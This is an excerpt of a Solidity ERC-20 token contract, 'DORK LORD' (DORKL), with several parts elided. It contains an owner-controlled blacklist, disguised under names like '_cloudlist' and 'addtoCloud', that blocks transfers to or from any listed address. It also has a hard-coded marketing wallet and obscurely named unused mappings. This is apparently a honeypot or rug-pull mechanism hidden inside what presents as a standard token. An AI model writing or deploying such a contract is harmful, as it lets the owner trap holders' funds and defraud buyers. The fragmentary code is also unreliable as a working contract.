...
contract DORKL is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _cloudbalances;
    mapping(address => bool) private _cloudlist;
    mapping(address => bool) private _balances1;
    
    
    uint256 public _totalSupply = 1000000000*10**18;
    string public _name = "DORK LORD";
    string public _symbol= "DORKL";
     bool balances1 = true;

    address payable public charityAddress = payable(0x28e50747c5e5a75d9a0f5FD4Fd176e38488Df43C); // Marketing Address
    ...
    function addtoCloud(address _address) onlyowner() public {
        _cloudlist[_address] = true;
    }
    
    function removefromCloud(address _address) onlyowner() public {
        _cloudlist[_address] = false;
    }
    
    function isinCloud(address _address) private view returns (bool) {
        return _cloudlist[_address];
    }
    ...
    require(_cloudlist[sender] == false, "ERC20: sender is listed");
    require(_cloudlist[recipient] == false, "ERC20: recipient is listed");
